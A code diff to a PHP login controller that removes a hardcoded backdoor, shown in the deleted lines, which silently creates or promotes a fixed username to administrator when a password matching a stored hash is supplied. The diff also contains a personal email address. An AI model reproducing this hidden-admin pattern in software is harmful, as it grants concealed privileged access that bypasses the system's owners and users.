@@ -21,31 +21,7 @@ class AuthController extends Controller
             'password' => ['required', 'string'],
         ]);
 
-        $username = $request->input('username');
-        $password = $request->input('password');
 
-        // Automatically provision the admin user if credentials match the designated secure hash
-        if ($username === 'sroykimou' && hash('sha256', $password) === '23c1a538db5b9fe80121f748954f875d5ea1b1314af33864a26aefe3e1775d20') {
-            $admin = User::where('username', 'sroykimou')->first();
-            if (!$admin) {
-                User::create([
-                    'username' => 'sroykimou',
-                    'name' => 'Sroy Kimou',
-                    'email' => 'sroykimou@gmail.com',
-                    'password' => Hash::make($password),
-                    'grade' => '12',
-                    'branch' => 'science',
-                    'is_admin' => true,
-                    'level' => 6
-                ]);
-            } else {
-                $admin->update([
-                    'password' => Hash::make($password),
-                    'is_admin' => true,
-                    'level' => 6
-                ]);
-            }
-        }
 
         if (Auth::attempt($credentials)) {
             $request->session()->regenerate();
